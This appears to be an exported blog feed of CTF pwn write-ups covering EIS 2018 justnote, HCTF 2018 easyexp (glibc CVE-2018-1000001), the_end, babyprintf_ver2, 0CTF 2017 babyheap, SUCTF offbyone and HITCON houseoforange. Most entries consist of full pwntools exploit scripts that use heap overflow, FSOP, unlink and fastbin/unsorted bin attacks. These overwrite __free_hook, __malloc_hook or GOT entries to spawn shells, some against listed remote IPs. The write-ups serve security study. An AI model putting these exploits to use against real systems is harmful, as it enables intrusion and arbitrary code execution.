随后利用这个堆溢出进行FSOP即可。在写exp的时候利用House Of Orange的方法一直有问题，后来先搞定一个0x60的chunk放入small bin，然后再unsorted bin attack和伪造FILE结构体就没问题了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112# coding=utf-8from pwn import *def Add(p, length, content): p.sendlineafter('your choice: ', str(1)) p.sendlineafter('length of note: ', str(length)) p.sendlineafter('note: ', content)def Delete(p, idx): p.sendlineafter('your choice: ', str(2)) p.sendlineafter('index of note: ', str(idx))def Edit(p, idx, content): p.sendlineafter('your choice: ', str(3)) p.sendlineafter('index of note: ', str(idx)) p.sendlineafter('note: ', content)def pwn(): BIN_PATH = './justnote' DEBUG = 0 LOCAL_LIBC = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('210.32.4.17', 13376) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # is same as the remote context.log_level = 'debug' Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 0) Delete(p, 2) payload = 'a' * (0x4440 - 0x4220) Add(p, -9223372036854775808, payload) #0 p.recvuntil(payload) libc_m88_addr = p.recv(6) if LOCAL_LIBC == 1: libc.address = u64(libc_m88_addr.ljust(8, '\x00')) - (0x7f5eae196b78 - 0x7f5eaddd2000) print 'libc base:' + str(hex(libc.address)) payload = 'b' * (0x108) + p64(0x111) + 'b' * (0x108) + p64(0x111) Edit(p, 0, payload) Add(p, 0x20, 'sunichi') #2 Delete(p, 0) Delete(p, 2) Delete(p, 4) payload = 'c' * (0x5575f99b1448 - 0x5575f99b1220) Add(p, -9223372036854775808, payload) #0 p.recvuntil(payload) stack_chunk_4 = p.recv(6) heap_chunk_base = u64(stack_chunk_4.ljust(8, '\x00')) - (0x55ca81101650 - 0x55ca81101210) print 'heap chunk base:' + str(hex(heap_chunk_base)) payload = 'd' * (0x108) + p64(0x111) + 'b' * (0x108) + p64(0x111) + libc_m88_addr + '\x00' * 2 + p64(libc.symbols['_IO_list_all'] - 0x10) Edit(p, 0, payload) payload = 'e' * (0x210) + p64(0) + p64(0x61) + libc_m88_addr + '\x00\x00' + p64(heap_chunk_base + 0x440) Edit(p, 0, payload) Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 2) payload = 'f' * 0x430 + p64(0) + p64(0x110) + p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) Edit(p, 0, payload) payload = 'g' * (0x210) fake_stream = '/bin/sh\x00' + p64(0x61) fake_stream += p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) fake_stream += p64(heap_chunk_base) + p64(heap_chunk_base + 1) fake_stream = fake_stream.ljust(0xa0, '\x00') fake_stream += p64(heap_chunk_base + 0x300 - 0x10) fake_stream = fake_stream.ljust(0xc0, '\x00') fake_stream += 3 * p64(0) + p64(heap_chunk_base + 0x300 - 0x8) payload += fake_stream payload += p64(2) payload += p64(3) payload += p64(libc.symbols['system']) + p64(0) * 0x20 Edit(p, 0, payload) Add(p, 0x70, 'hack by sunichi') Delete(p, 2) p.interactive() p.close() # EIS&#123;it_is_2018_and_we_still_mess_around_with_note&#125;if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>eis</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE–2018-1000001 & hctf 2018 easyexp]]></title>
    <url>%2F2018%2F11%2F16%2Fhctf18-easyexp%2F</url>
    <content type="text"><![CDATA[做题的时候有考虑过CVE，但当时没去查…… CVE–2018-1000001该题思路来源于glibc的CVE–2018-1000001，是一个glibc的缓冲区溢出漏洞，分析后发现能在堆上进行溢出。 以下分析stdlib/canonicalize.c中的__realpath()函数（__canonicalize_file_name仅仅调用__realpath()，没有其它操作）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197/* Return the canonical absolute name of a given file. Copyright (C) 1996-2016 Free Software Foundation, Inc. This file is part of the GNU C Library. The GNU C Library is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version. The GNU C Library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details. You should have received a copy of the GNU Lesser General Public License along with the GNU C Library; if not, see &lt;http://www.gnu.org/licenses/&gt;. */#include &lt;assert.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;limits.h&gt;#include &lt;sys/stat.h&gt;#include &lt;errno.h&gt;#include &lt;stddef.h&gt;#include &lt;eloop-threshold.h&gt;#include &lt;shlib-compat.h&gt;/* Return the canonical absolute name of file NAME. A canonical name does not contain any `.', `..' components nor any repeated path separators ('/') or symlinks. All path components must exist. If RESOLVED is null, the result is malloc'd; otherwise, if the canonical name is PATH_MAX chars or more, returns null with `errno' set to ENAMETOOLONG; if the name fits in fewer than PATH_MAX chars, returns the name in RESOLVED. If the name cannot be resolved and RESOLVED is non-NULL, it contains the path of the first component that cannot be resolved. If the path can be resolved, RESOLVED holds the same value as the value returned. */char *__realpath (const char *name, char *resolved) //name是传入的字符串&#123; char *rpath, *dest, *extra_buf = NULL; const char *start, *end, *rpath_limit; long int path_max; int num_links = 0; // ... // 此部分是常规的一些检查，不影响理解代码逻辑 // ... // 设置path_max参数#ifdef PATH_MAX path_max = PATH_MAX;#else path_max = pathconf (name, _PC_PATH_MAX); if (path_max &lt;= 0) path_max = 1024;#endif if (resolved == NULL) // __canonicalize_file_name默认传参NULL &#123; rpath = malloc (path_max); // 申请保存解析后的路径的chunk，发生溢出的即为该chunk if (rpath == NULL) return NULL; &#125; else rpath = resolved; rpath_limit = rpath + path_max; if (name[0] != '/') &#123; if (!__getcwd (rpath, path_max)) // getcwd返回rpath的地址 &#123; rpath[0] = '\0'; goto error; &#125; dest = __rawmemchr (rpath, '\0'); // dest记录rpath中字符串的结尾 &#125; else &#123; rpath[0] = '/'; dest = rpath + 1; &#125; for (start = end = name; *start; start = end) &#123; struct stat64 st; int n; /* Skip sequence of multiple path-separators. */ while (*start == '/') // 如果以/开头，向后移动 ++start; /* Find end of path component. */ for (end = start; *end &amp;&amp; *end != '/'; ++end) /* Nothing. */; if (end - start == 0) break; else if (end - start == 1 &amp;&amp; start[0] == '.') /* nothing */; else if (end - start == 2 &amp;&amp; start[0] == '.' &amp;&amp; start[1] == '.') &#123; /* Back up to previous component, ignore if at root already. */ // dest初始值为rpath中字符串（getcwd返回值）的结尾 // 如果遇到..，向前搜索/字符，初始情况下：dest = rpath + len &gt; rpath + 1。所以在第一个..时会在while中出现前向溢出 if (dest &gt; rpath + 1) while ((--dest)[-1] != '/'); &#125; else &#123; size_t new_size; if (dest[-1] != '/') *dest++ = '/'; // 在触发漏洞前，dest已经向前溢出，加上len后不会超过rpath_limit if (dest + (end - start) &gt;= rpath_limit) // rpath_limit = rpath + path_max &#123; // ... &#125; // dest为前溢地址，start为路径../../x处的x的地址，即从路径中拷贝第三个片段到dest中 // void *mempcpy（void *dest, const void *src, size_t len) dest = __mempcpy (dest, start, end - start); *dest = '\0'; // __lxstat64可以用来检查rpath指向的文件是否存在，rpath即为(unreachable)/xxxxx if (__lxstat64 (_STAT_VER, rpath, &amp;st) &lt; 0) goto error; if (S_ISLNK (st.st_mode)) &#123; char *buf = __alloca (path_max); size_t len; if (++num_links &gt; __eloop_threshold ()) &#123; __set_errno (ELOOP); goto error; &#125; n = __readlink (rpath, buf, path_max - 1); if (n &lt; 0) goto error; buf[n] = '\0'; if (!extra_buf) extra_buf = __alloca (path_max); len = strlen (end); if ((long int) (n + len) &gt;= path_max) &#123; __set_errno (ENAMETOOLONG); goto error; &#125; /* Careful here, end may be a pointer into extra_buf... */ memmove (&amp;extra_buf[n], end, len + 1); name = end = memcpy (extra_buf, buf, n); if (buf[0] == '/') dest = rpath + 1; /* It's an absolute symlink */ else /* Back up to previous component, ignore if at root already: */ if (dest &gt; rpath + 1) while ((--dest)[-1] != '/'); &#125; else if (!S_ISDIR (st.st_mode) &amp;&amp; *end != '\0') &#123; __set_errno (ENOTDIR); goto error; &#125; &#125; &#125; if (dest &gt; rpath + 1 &amp;&amp; dest[-1] == '/') --dest; *dest = '\0'; assert (resolved == NULL || resolved == rpath); return rpath;error: assert (resolved == NULL || resolved == rpath); if (resolved == NULL) free (rpath); return NULL;&#125;versioned_symbol (libc, __realpath, realpath, GLIBC_2_3);char *__canonicalize_file_name (const char *name)&#123; return __realpath (name, NULL);&#125;weak_alias (__canonicalize_file_name, canonicalize_file_name) 从源代码中可以发现，如果getcwd返回的地址不以/开头的话，就会产生堆的上溢的问题，同时能够向这个上溢的地址写入数据。 easyexp本题的原理即__canonicalize_file_name。在本题中，由于程序变更工作目录后，并没有更新当前目录的根目录，因此getcwd() 会在返回的路径前加上(unreachable)，即getcwd()在本题中返回(unreachable)/tmp。随后为了保证程序正常运行，需要通过__lxstat64()的检查，所以需要保证(unreachable)/tmp存在，故将用户名设置为(unreachable)并在该文件夹下创建名为tmp的文件。 由于存在堆上的前溢且程序构造了堆的使用，因此可以修改chunk的pre_inuse，利用unlink获得shell。 程序创建文件的过程在程序中定义了如下数据结构： 12345struct FILE_CACHE &#123; char *content; int content_length; char filename[84];&#125; 在bss上存在一个FILE_CACHE[3]数组用于保存相关信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243if ( filename )&#123; if ( strstr(filename, "..") || *filename == '/' ) &#123; puts("you can't go out of tmpfs"); &#125; else &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; if ( !strcmp(filename, (const char *)(0x60LL * i + 0x60318C)) ) &#123; printf("write something:"); InputString((__int64)FILE_CACHE[12 * i], (unsigned int)FILE_CACHE[12 * i + 1]); g_idx = (i + 1) % 3; return __readfsqword(0x28u) ^ v8; &#125; &#125; if ( FILE_CACHE[12 * g_idx] ) &#123; s = fopen((const char *)(0x60LL * g_idx + 0x60318C), "w"); fwrite(FILE_CACHE[12 * g_idx], 1uLL, LODWORD(FILE_CACHE[12 * g_idx + 1]), s); fclose(s); free((void *)FILE_CACHE[12 * g_idx]); &#125; strcpy((char *)(0x60LL * g_idx + 0x60318C), filename); fd = open(filename, 131521, 420LL); if ( fd &lt; 0 ) &#123; puts("mkfile:create failed."); exit(-1); &#125; printf("write something:"); InputString((__int64)&amp;buf, 0x1000u); write(fd, &amp;buf, 0x1000uLL); v2 = g_idx; FILE_CACHE[12 * v2] = strdup(&amp;buf); v3 = g_idx; LODWORD(FILE_CACHE[12 * v3 + 1]) = strlen(&amp;buf); close(fd); g_idx = (g_idx + 1) % 3; &#125;&#125; 以上程序位于创建文件的函数中，当用户创建文件时，会现在“缓存”中查找，如果文件名相同或“缓存”未满，则会在“缓存”上保存一份数据，如已满则重置一个“缓存”。这里的结构可以在unlink中进行利用。 程序创建文件夹的过程12345678910111213141516171819for ( i = 0; ; i = *(_DWORD *)v3 + 1 )&#123; *(_QWORD *)&amp;v3[4] = strchr(&amp;a1[i], '/'); if ( *(_QWORD *)&amp;v3[4] ) *(_DWORD *)v3 = *(_DWORD *)&amp;v3[4] - (_DWORD)a1; else *(_QWORD *)v3 = (unsigned int)strlen(a1); snprintf(&amp;path, 0x1000uLL, "%s/%.*s", cur_work_dir, *(unsigned int *)v3, a1); mkdir(&amp;path, 0x1EDu); if ( !a1[*(signed int *)v3] ) break;&#125;ptr = canonicalize_file_name(a1);if ( !ptr )&#123; puts("mkdir:create failed."); exit(-1);&#125;free(ptr); 当程序调用mkdir()函数后，会将用户输入的路径传入canonicalize_file_name()进行验证是否创建成功，此处即为触发漏洞的位置。 利用思路当“缓存”满后，将会重用最后使用的“缓存”的下一个“缓存”。首先将三个“缓存”都填满，第二个缓存内容均为’/‘，利用CVE漏洞改写第三个“缓存”指向的内容的chunk的size域，将size改小（防止和top chunk合并）并布置合适的fake chunk。 随后进行unlink攻击，通过改写“缓存”结构体中的内容指针来泄漏地址和修改__free_hook。 Exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# coding=utf-8from pwn import *def Mkfile(p, filename, content): p.sendlineafter('$', 'mkfile ' + filename) p.sendlineafter('write something:', content)def Mkdir(p, path): p.sendlineafter('$', 'mkdir ' + path)def pwn(): BIN_PATH = './easyexp' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH, env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] libc = ELF('./libc.so.6') p.sendlineafter('input your home\'s name: ', '(unreachable)') Mkfile(p, 'hack', 'hack by sunichi') Mkfile(p, '(unreachable)/tmp', '/' * 0x107) Mkfile(p, 'aa', 'a' * (0x90 + 0x20)) Mkdir(p, '../../s\x90') Mkdir(p, '../../\x00') payload = 'a' * 0x88 + p64(0x31) Mkfile(p, 'aa', payload) payload = 'a' * 0x100 + p64(0x100) Mkfile(p, '(unreachable)/tmp', payload) payload = p64(0) + p64(0x101) + p64(0x6031e0 - 0x18) + p64(0x6031e0 - 0x10) Mkfile(p, '(unreachable)/tmp', payload) Mkfile(p, 'bb', 'bb') payload = p64(0) * 3 + p64(0x6031e0) + p64(0x726e752800000100) + p64(0x656c626168636165) + p64(0x000000706d742f29) + p64(0) * 8 + p64(elf.got['free']) + p64(0x0000626200000008) Mkfile(p, '(unreachable)/tmp', payload) p.sendlineafter('$', 'cat bb') p.recvuntil('\x20') recv = p.recvuntil('\x0a\x1b', drop=True) libc.address = u64(recv + '\x00\x00') - libc.symbols['free'] print hex(libc.address) payload = p64(libc.symbols['__free_hook']) + p64(0x726e752800000100) + p64(0x656c626168636165) + p64(0x000000706d742f29) + p64(0) * 8 + p64(next(libc.search('/bin/sh\x00'))) + p64(0x0000626200000008) Mkfile(p, '(unreachable)/tmp', payload) payload = p64(libc.symbols['system']) Mkfile(p, '(unreachable)/tmp', payload) p.sendlineafter('$', 'mkfile getshell') p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
        <tag>libc</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hctf 2018 pwn writeup]]></title>
    <url>%2F2018%2F11%2F12%2Fhctf2018%2F</url>
    <content type="text"><![CDATA[the_end程序自身的功能很简单： 提供libc地址（2.23） 关闭stdout和stderr 5次对所给地址修改1字节的机会 在进行5次修改后，程序调用了exit()函数。一开始的思路是对libc中的FILE结构体进行修改，从而将程序劫持到one_gadget处，但是比赛时想到的方法大概需要10字节左右的修改，放弃。 接着就开始对exit()函数进行研究，在gdb里对exit()函数一步一步地进行跟踪，发现两个能利用的点： 0x00 CTF 2017 left 的解题思路，但是无法获得随机数，放弃。 在_dl_fini函数中，会执行call QWORD PTR [rip+0x216414] #&lt;_rtld_global+3848&gt;，该位置位于ld.so当中，是能够修改的位置。 因此在第二个点的基础上继续研究。通过vmmap可以得知ld.so的这个位置到libc.so.6的基地址的偏移是固定的，虽然他们中间的空间不是连续的（后续再具体研究一下为什么Orz，这题中没问题就对啦）。将该位置的数据修改为one_gadget即可。 另一个需要解决的问题是程序关闭了stdout，所以拿到shell后无法看到服务器的返回。通过exec /bin/sh 1&gt;&amp;0即可对输出流进行重定向，能正常与shell交互。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './the_end' DEBUG = 1 local = 1 if DEBUG == 1: if local == 1: p = process(BIN_PATH) else: p = process(BIN_PATH, env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': if local == 1: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('./libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('150.109.44.250', 20002) p.recvuntil('Input your token:') p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz') elf = ELF(BIN_PATH) libc = ELF('./libc.so.6') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p, gdbscript='b *0x0000555555554964') p.recvuntil('here is a gift ') recv = p.recvuntil(',', drop=True) libc.address = int(recv, 16) - libc.symbols['sleep'] print hex(libc.address) one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] p.recvuntil('luck ;)\n') p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000))) p.send(p64(libc.address + one_gadget[2])[0]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 1)) p.send(p64(libc.address + one_gadget[2])[1]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 2)) p.send(p64(libc.address + one_gadget[2])[2]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 3)) p.send(p64(libc.address + one_gadget[2])[3]) p.send(p64(libc.address + (0x7ffff7ffdf48 - 0x00007ffff7a0d000) + 4)) p.send(p64(libc.address + one_gadget[2])[4]) # exec /bin/sh 1&gt;&amp;0 p.interactive() p.close()if __name__ == '__main__': pwn() babyprintf_ver2程序本身实现了类似于格式化字符串漏洞的功能，但调用的是printf_chk()函数。用于保存用户输入的字符串的全局变量存在溢出，能够覆盖stdout指针，程序提供了.bss的地址。 因此，通过溢出将stdout指针指回.bss上，并在指向的地方构造虚假的stdout结构体，由于存在着vtable的检查，因此vtable处的值会被程序自己填入。通过构造缓冲区的指针为.bss上的地址，能够将这个vtable的值泄漏出来，从而获得libc的基地址。 同样地，通过构造缓冲区的指针，能够进行任意地址写的操作，将__malloc_hook处修改为one_gadget的地址。通过触发printf_chk()函数的报错进而触发malloc()拿到shell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# coding=utf-8from pwn import *def pwn(): BIN_PATH = './babyprintf_ver2' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('150.109.44.250', 20005) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('Input your token:') p.sendline('8RMQq9PuDRurd91OVhADpDDK30eqjAqz') context.log_level = 'debug' p.recvuntil('buffer location to') recv = p.recvuntil('\n', drop=True) bss_address = int(recv, 16) p.recvuntil('Have fun!\n') payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3 payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d) payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) p.recvuntil('permitted!\n') p.sendline('a' * 8) recv = p.recv(8) libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000) print hex(libc.address) payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 7 payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) malloc_hook_addr = libc.symbols['__malloc_hook'] payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 6 payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) p.sendline(p64(libc.address + 0x10a38c)) # one_gadget payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) payload += p64(bss_address + 0x200) * 7 payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000) payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff) p.sendline(payload) sleep(0.5) p.sendline('%49$p') p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf 2017 babyheap]]></title>
    <url>%2F2018%2F07%2F11%2F0ctf17-pwn-babyheap%2F</url>
    <content type="text"><![CDATA[This pwn is a classic heap pwn. In its Edit() function exits a heap overflow of arbitrarily write. 1234567891011121314151617181920212223242526__int64 __fastcall Edit(__int64 List)&#123; __int64 Item; // rax int v2; // [rsp+18h] [rbp-8h] int len; // [rsp+1Ch] [rbp-4h] printf("Index: "); Item = InputNum(); v2 = Item; if ( (signed int)Item &gt;= 0 &amp;&amp; (signed int)Item &lt;= 15 ) &#123; Item = *(unsigned int *)(24LL * (signed int)Item + List); if ( (_DWORD)Item == 1 ) &#123; printf("Size: "); // overflow Item = InputNum(); len = Item; if ( (signed int)Item &gt; 0 ) &#123; printf("Content: "); Item = InputString(*(_QWORD *)(24LL * v2 + List + 16), len); &#125; &#125; &#125; return Item;&#125; Because the List(contains each block’s status, size and content’s pointer) is at random address, we cannot overflow and overwrite the List. So what I chose to do is to overflow the chunk to leak the libc information and perform fastbin attack. 1234567891011121314151617181920212223242526272829def pwn(): p = process('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] gdb.attach(p, gdbscript='b *' + str(hex(0x555555554000 + 0x113d))) Add(p, 0x60) #0 Add(p, 0x60) #1 Add(p, 0x60) #2 Add(p, 0x60) #3 Add(p, 0x80) #4 Add(p, 0x80) #5 Add(p, 0x200 - 0x90 - 0x10) #6 Add(p, 0x80) #7 Add(p, 0x80) #8 Edit(p, 4, 'a' * 0x88 + p64(0x201)) Delete(p, 5) #5 Add(p, 0x80) #5 recv = Show(p, 6) libc_base_addr = u64(recv[0:8]) - 0x3c4b78 libc.address = libc_base_addr print hex(libc.symbols['__malloc_hook']) # chunk size 0x7f, ready for fastbin attack fake_chunk = libc.symbols['__malloc_hook'] - 0x10 - 3]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2017</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suCTF1 2018 pwn heap(offbyone) writeup]]></title>
    <url>%2F2018%2F07%2F07%2Fsuctf18-pwn-heap(offbyone)%2F</url>
    <content type="text"><![CDATA[Checksec： 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) This pwn exists off-by-one: When pwner wants to get a new chunk, the program will malloc() two same size chunk. The pwner’s input will be put into the first chunk, and then the program uses strcpy() without input size to do the memory copy. The first chunk will be free() very soon. 12345678910111213141516171819202122if ( size &gt; 0x7F &amp;&amp; size &lt;= 0x100 )&#123; fake_new_chunk = malloc(size); new_chunk = malloc(size); memset(new_chunk, 0, size); memset(fake_new_chunk, 0, size); puts("input your data"); read(0, fake_new_chunk, (unsigned int)size); strcpy((char *)new_chunk, (const char *)fake_new_chunk); ++total; for ( i = 0; i &lt; total; ++i ) &#123; if ( !heap_form[i] ) &#123; heap_form[i] = (char *)new_chunk; break; &#125; &#125; if ( i == total ) heap_form[i] = (char *)new_chunk; free(fake_new_chunk);&#125; If pwner doesn’t enter \x00 to end the string, the next chunk’s size will be regarded as a part of the string. Here exists off-by-one. We first malloc() 5 chunks, chunk 1-4 will reuse the first chunk’s fake_new_chunk to do the string copy. Chunk 1 will be used to get shell by system(). 1234567891011def pwn(): p = process('./offbyone') elf = ELF('./offbyone') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' # chunk size 0x80 ~ 0x100 Add(p, 0x100, '0' * 0x100) Add(p, 0x100, '/bin/sh\x00') Add(p, 0x100, '2' * 0x100) Add(p, 0x88, '3' * 0x88) Add(p, 0x100, '4' * 0x100) Construct a fake chunk of size 0x80 and set chunk 4 pre_inuse to 0 then perform the unlink attack. 123456payload = 2 * p64(0)payload += p64(0x6020d8 - 0x18) + p64(0x6020d8 - 0x10)payload = payload.ljust(0x80,'\x00')payload += p64(0x80) + '\x10'Edit(p, 3, payload)Delete(p, 4) When we free() the chunk 4, it will merge the fake chunk 3 of size 0x80 instead of 0x90. The unlink attack detail: 12345FD = 0x6020c0;BK = 0x6020c8;// will pass the security checkFD-&gt;bk = BK; // *(0x6020d8) = 0x6020c8BK-&gt;fd = FD; // *(0x6020d8) = 0x6020c0 After unlink, the chunk_list[3] will point to the chunk_list[0]’s address and we will have the ability to write and read arbitrarily. Then leak the libc address and get the shell by overwrite the free@got. 1234567891011Edit(p, 3, p64(elf.got['malloc']))libc_base_addr = Show(p, 0)libc_base_addr = u64(libc_base_addr.ljust(8, '\x00')) - libc.symbols['malloc']libc.address = libc_base_addrEdit(p, 3, p64(elf.got['free']))Edit(p, 0, p64(libc.symbols['system']))Delete(p, 1)p.interactive()p.close() Relevant Articlehttps://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitcon 2016 houseoforange writeup]]></title>
    <url>%2F2018%2F07%2F03%2Fhitcon16-houseoforange%2F</url>
    <content type="text"><![CDATA[0x00 Program OverallThe program can Build(), Upgrade() and See() the house of orange. In Build(), the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the other is the name. At the end of the Build(), a variable on bss will store the new house address and use it in Upgrade() and See(). We can use Upgrade() and See() to update and see the newest house. 12345678910111213141516171819202122232425262728293031323334353637int Build()&#123; //... if ( (unsigned int)COUNT &gt; 3 ) &#123; puts("Too many house"); exit(1); &#125; New_House = malloc(0x10uLL); printf("Length of name :"); size = InputNum(); if ( size &gt; 0x1000 ) size = 4096; *((_QWORD *)New_House + 1) = malloc(size); if ( !*((_QWORD *)New_House + 1) ) &#123; puts("Malloc error !!!"); exit(1); &#125; printf("Name :"); InputString(*((void **)New_House + 1), size); new_price = calloc(1uLL, 8uLL); printf("Price of Orange:", 8LL); *new_price = InputNum(); Show_Color(); printf("Color of Orange:"); Color_Num = InputNum(); //... if ( Color_Num == 56746 ) new_price[1] = 56746; else new_price[1] = Color_Num + 30; *(_QWORD *)New_House = new_price; Last_House = New_House; ++COUNT; return puts("Finish");&#125; 0x01 Program VulnerabilitiesWhen the program calls the Upgrade(), it allows user to give it the length of the name which leads to heap overflow: 123456789101112int Upgrade()&#123; //... printf("Length of name :"); v2 = InputNum(); if ( v2 &gt; 0x1000 ) v2 = 4096; printf("Name:"); InputString((void *)Last_House[1], v2); //... return puts("Finish");&#125; So, use unsorted bin attack and house of orange to get the shell. 0x02 Pwn!First we need to use heap overflow to trigger _int_free() in sysmalloc() to leak the libc address. 12345678910111213141516171819def pwn(): p = process('./houseoforange') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' Build(p, 0x80, 'sunichi1', 0x10, 1) # 1 # overflow the top chunk's size payload = 'B'*0x80 + p64(0) + p64(0x21) + p32(0x1) + p32(0x1f) + 2 * p64(0) + p64(0xf31) Upgrade(p, 0x100, payload, 0x10, 2) # 2 # trigger free in sysmalloc Build(p, 0x1000, 'sunichi2', 0x10, 3) # 3 # get the info of libc address Build(p, 0x400, 'x', 4, 4) # 0x400 = 1024 =&gt; large bin / still have some questions See(p) p.recvuntil('house : ') libc_addr = p.recv(6) libc_addr = u64(libc_addr.ljust(8, '\x00')) libc.address = libc_addr - 0x3c4b78 - 0x600 libc_base_addr = libc_addr - 0x3c4b78 - 0x600 Second, leak the heap address. 1234567# leak the heap addressUpgrade(p, 0x400, '1' * 0x10, 0x10, 5)See(p)p.recvuntil('1' * 0x10)heap_addr = p.recv(6)# address is the third house content address - 0x10heap_addr = u64(heap_addr.ljust(8, '\x00')) The final step is to construct the a chunk to perform unsorted bin attack and house of orange. 12345678910111213141516171819# unsorted bin 